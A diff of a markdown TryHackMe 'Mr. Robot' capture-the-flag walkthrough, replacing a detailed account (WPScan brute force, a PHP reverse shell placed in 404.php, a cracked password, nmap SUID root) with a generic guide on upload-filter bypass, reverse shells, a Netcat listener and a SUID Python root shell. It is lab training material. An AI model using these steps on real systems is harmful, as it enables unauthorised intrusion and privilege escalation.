@@ -1,275 +1,163 @@
-# 🕵️‍♂️ TryHackMe: Mr. Robot Room - Full Walkthrough
-
-📌 **Target IP**: `10.10.220.129`  
-✍️ **Author**: PentestNinja  
-📅 **Date**: June 2025  
+## 🚀 Step 1: Connect to TryHackMe VPN  
+Before starting, **always connect to the TryHackMe VPN** to access the target network securely.  
+Without VPN, your machine won’t be able to reach the target IP.
 
 ---
 
-## 🔌 Step 1: Connect to VPN
+## 🔍 Step 2: Nmap Scan - Discover Open Ports & Services
 
-Before doing anything — first thing I always do:  
-👉 **Connect to TryHackMe VPN network**.
-
-This ensures that my machine is connected to their private network so I can access the target machine.
-
----
-
-## 🔍 Step 2: Nmap Scan (Finding Open Ports)
-
-Now I wanted to know:  
-Which ports are open on this target machine? Which services are running?
-
-🔧 Tool used: **Nmap**
+Run a detailed and fast Nmap scan with:
 
 
-nmap -sV -O -T4 10.10.220.129
+nmap -T5 -O -sV 10.10.145.133 -oN nmap.results
 
-Options explained:
+What do these options mean?
 
-    -sV → Detect version of services (like Apache, OpenSSH etc.)
+    -T5: Maximum speed, aggressive timing for faster scan
 
-    -O → Try to detect Operating System
+    -O: Operating system detection
 
-    -T4 → Make scanning faster
+    -sV: Service version detection — crucial for finding version-specific vulnerabilities
 
-    10.10.220.129 → Target machine IP
+    -oN: Save output in a readable format for later review
 
-🧾 Result:
+Optional output formats:
 
-    ✅ Port 22 → SSH open (but not vulnerable)
+You can also save scans in different formats to use with other tools or scripts:
+Format	Option	Purpose
+Grepable	-oG nmap.grep	Easy to grep through results
+XML	-oX nmap.xml	Structured output for tools
+Script Kiddie	-oS nmap.script	Funny but rarely used format
+All formats	-oA allformats	Saves all above formats
 
-    ✅ Port 80 → HTTP open → a website is running
+    💡 Pro tip: Always use -sV! Vulnerabilities are often specific to service versions.
 
-🌐 Step 3: Checking Website (robots.txt)
+🔐 Step 3: Directory Brute-Forcing for Hidden Paths
 
-Since port 80 is open, I opened the browser and visited:
+Use tools like Dirbuster or Gobuster to discover hidden directories or files on the webserver.
 
-http://10.10.220.129
+gobuster dir -u http://10.10.145.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
-One of the first files I always check is:
+Why?
 
-http://10.10.220.129/robots.txt
+Many websites hide admin panels or important files under non-obvious paths — brute forcing helps find these.
+📂 Step 4: Analyze Website & Check robots.txt
 
-📂 Found in robots.txt:
+Visit the site in your browser:
 
-    ✅ First flag (easy)
+http://10.10.145.133
 
-    ✅ fsocity.dic → a wordlist file → used later for password brute force
+Check /robots.txt:
 
-🗂 Step 4: Directory Brute-forcing
+http://10.10.145.133/robots.txt
 
-Goal: Discover hidden folders or files on the website.
+Developers sometimes list disallowed directories here, which may contain sensitive files or hints.
+🛠️ Step 5: Found /panel/ Directory - Upload Reverse Shell
+Why PHP reverse shell?
 
-🔧 Tool used: Dirbuster
+    PHP files are executed by the web server (Apache).
 
-📍 Target:
+    Executables like .exe won’t run in a web environment.
 
-http://10.10.220.129
+    Other scripting files like JavaScript often get blocked or are client-side only.
 
-At the same time, I also checked each webpage’s source code (CTRL+U) — sometimes developers leave hints in comments.
+Important: Bypass PHP Upload Restrictions
 
-🧾 Dirbuster Result:
+Often, .php uploads are blocked (blacklisted). You can try:
 
-    ✅ Discovered /wp-login.php
-    → This indicates the site is running WordPress CMS
+    Changing extension to .php3, .php4, .php5 (older PHP versions accepted by server).
 
-👤 Step 5: Finding Username
+    This bypasses blacklist filtering since it’s based on extension blocking, not whitelist.
 
-Since this room is based on the Mr. Robot TV series and the main character is Elliot, I guessed:
+🐚 Step 6: Prepare PHP Reverse Shell
 
-Username = elliot
+    Download PHP reverse shell from PentestMonkey
 
-🔓 Step 6: Brute-force WordPress Password
+    Change the IP and port to your TryHackMe VPN IP and listening port (4444 recommended).
 
-Used the fsocity.dic file from robots.txt, but it had many duplicates.
+    Upload your modified shell file to /panel/.
 
-🧹 First, cleaned it using:
+📡 Step 7: Start Netcat Listener
 
-cat fsocity.dic | sort | uniq > final.txt
-
-Now I have a clean wordlist final.txt.
-
-🔧 Tool used: WPScan
-
-wpscan --url http://10.10.220.129/wp-login.php -U elliot -P final.txt --password-attack wp-login
-
-✅ Result:
-
-    WPScan found the correct password
-
-    Logged in successfully as elliot in WordPress admin panel
-
-🐚 Step 7: Uploading Reverse Shell
-
-🎯 Goal: Get remote shell access to the server.
-
-Steps:
-
-    Downloaded PHP reverse shell from PentestMonkey GitHub
-
-    Edited the file:
-
-    $ip = "<Your THM VPN IP>";
-    $port = 4444;
-
-    Uploaded it via:
-
-        Appearance → Theme Editor → 404.php
-
-⚠️ Why 404.php?
-→ It runs whenever a non-existent page is accessed — perfect for triggering our shell.
-📡 Step 8: Setting up Netcat Listener
-
-Before triggering the shell, I started a listener using:
+Open your terminal and run:
 
 nc -lvnp 4444
 
-🧾 Explanation:
+Explanation:
 
-    nc = Netcat tool
+    n: No DNS lookup (faster output)
 
-    -l = Listen mode
+    l: Listen mode (wait for incoming connection)
 
-    -vnp 4444 = Verbose, listen on port 4444
+    v: Verbose mode (show details)
 
-🚀 Step 9: Triggering Reverse Shell
+    p 4444: Listen on port 4444
 
-Visited:
+💥 Step 8: Trigger the Reverse Shell
 
-http://10.10.220.129/anyrandomstring
+Visit the URL where your shell is uploaded:
 
-Example:
+http://10.10.145.133/panel/<your_shell_filename>
 
-http://10.10.220.129/wjjfejejfuwbdb
+If everything works, you’ll get a shell prompt on your Netcat listener — you now have command execution on the server!
+🔎 Step 9: Manual Enumeration on Target Server
 
-✅ Reverse shell received in Netcat
-→ Now I had remote command line access on the server
-🛠 Step 10: Upgrading Shell
+Explore the file system to find:
 
-First reverse shell is very limited. So I upgraded it to a full interactive TTY shell:
+    Credentials
 
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+    Flags
 
-Now my shell could:
+    Useful files for privilege escalation
 
-    Use arrow keys
+Start by checking /var/www for the first flag.
+🔒 Step 10: Privilege Escalation Using SUID Binaries
+What is SUID?
 
-    Run clear, su
+SUID (Set User ID) is a special permission allowing executables to run with the file owner’s privileges (often root).
 
-    Handle interactive input properly
+Attackers scan for SUID binaries to escalate privileges.
+🔍 Step 11: Find SUID Files
 
-🧑‍💻 Step 11: Privilege Escalation to User robot
-
-Explored the system and navigated to:
-
-cd /home/robot
-
-Found:
-
-    ❌ Second flag (access denied)
-
-    ✅ password.raw-md5 file → contained an MD5 hashed password
-
-Viewed the file:
-
-cat password.raw-md5
-
-Got:
-
-robot:<MD5 hash>
-
-🔓 Cracked the hash using:
-crackstation.net
-
-✅ Password = atoz
-
-Switched user:
-
-su robot
-Password: atoz
-
-→ Now I was user robot
-🧠 Step 12: Privilege Escalation to Root
-
-Goal: Gain root access
-1️⃣ Checked if robot can use sudo:
-
-sudo -l
-
-→ ❌ No sudo privileges
-2️⃣ Looked for SUID binaries:
+Run:
 
 find / -perm -4000 -type f 2>/dev/null
 
-📍 Found:
+    Searches entire system for files with SUID bit set.
 
-/usr/bin/nmap
+    Suppresses permission denied errors.
 
-→ This version of Nmap supports interactive mode
-3️⃣ Used Nmap to get root:
+⚠️ Step 12: Example SUID Exploit - Python
 
-nmap --interactive
+If /usr/bin/python has SUID root permissions, run:
 
-Inside Nmap shell:
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
-!sh
+This spawns a root shell because Python inherits root permissions.
+✅ Summary & Key Takeaways
 
-✅ Result:
+    Always scan with nmap -sV to find versions — essential for exploits.
 
-whoami
-root
+    Use directory brute forcing to uncover hidden paths like /panel/.
 
-🏁 Step 13: Capturing Root Flag
+    PHP reverse shell is preferred for web server exploitation; try extension bypasses.
 
-Navigated to root folder:
+    Netcat listener must be running before triggering the shell.
 
-cd /root
-ls -la
-cat root.txt
+    Manually explore server for flags and sensitive files.
 
-✅ Captured the root flag
-📘 What I Learned From This Room
+    SUID binaries are common privilege escalation vectors.
 
-✅ Full enumeration is key:
+    Exploit SUID Python to gain root shell quickly if available.
 
-    robots.txt, source code, hidden folders, SUID binaries
-
-✅ Clean your wordlist before brute-force — saves time
-✅ Username guessing can be based on room theme
-✅ The 404.php reverse shell trick is very useful
-✅ Always upgrade shell to TTY
-✅ Privilege escalation can be simple — old tools like Nmap give full root
-⚠️ Mistakes to Avoid Next Time
-
-    Should have run find / -perm -4000 -type f earlier — would get root faster
-
-    Forgot to run LinPEAS — must practice using it more
-
-    Wasted time trying to upload reverse shell via plugin — 404.php was easier
-
-    Should always check kernel version — even if not needed here
-
-🚀 Things to Improve
-
-    Practice faster privilege escalation
-
-    Learn more reverse shell methods (Python, Bash, etc.)
-
-    Use WPScan’s advanced features
-
-    Automate common tasks (e.g. wordlist cleanup, shell upgrade)
-
-✅ End of Walkthrough
-
-Thanks for reading!
-This was a fun and educational room — great for improving practical hacking skills!
-
-🎯 Happy hacking!
 📚 Resources
 
-    🧠 TryHackMe - Mr. Robot Room
+    PentestMonkey PHP Reverse Shell
 
-    🐚 PentestMonkey PHP Reverse Shell
+    TryHackMe
 
-    🔐 CrackStation - Online Hash Cracker
+    Nmap Official Documentation
+
+    Gobuster GitHub
+
+Happy Hacking! 🕵️‍♂️🔐
